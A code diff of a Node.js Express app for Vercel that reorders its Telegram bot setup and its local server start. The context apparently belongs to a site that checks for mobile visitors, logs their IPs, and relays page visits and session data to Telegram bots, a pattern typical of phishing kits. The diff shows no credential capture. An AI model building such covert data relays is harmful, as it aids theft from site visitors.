@@ -46,6 +46,7 @@ const mobileCheck = (req, res, next) => {
 };
 
 // Initialize Telegram Bots
+const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 const visitorBot = new TelegramBot(VISITOR_BOT_TOKEN, { polling: false }); // No polling needed for just sending
 
 // Endpoint to notify when someone opens the page
@@ -137,8 +138,7 @@ const getIP = (req) => {
 // In-memory storage for user sessions
 const userSessions = {};
 
-// Initialize Telegram Bot for Data
-const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
+// Bot listeners and connection test
 
 // Test Connection
 bot.sendMessage(CHAT_ID, "🚀 *SISTEMA INICIADO* - Bot de datos listo.")
@@ -432,20 +432,10 @@ process.on('unhandledRejection', (reason, promise) => {
     console.error('UNHANDLED REJECTION:', reason);
 });
 
-// Start Server with Error Handling
-if (process.env.NODE_ENV !== 'production') {
-    const server = app.listen(port, () => {
-        console.log(`Server running at http://localhost:${port}`);
-    });
-
-    server.on('error', (e) => {
-        if (e.code === 'EADDRINUSE') {
-            console.error(`Port ${port} is already in use!`);
-        } else {
-            console.error('Server error:', e);
-        }
-    });
-}
-
-// Export the app for Vercel
+// Export the app for Vercel (Required!)
 module.exports = app;
+
+// Local testing only
+if (process.env.NODE_ENV !== 'production') {
+    app.listen(port, () => console.log(`Server running locally at http://localhost:${port}`));
+}
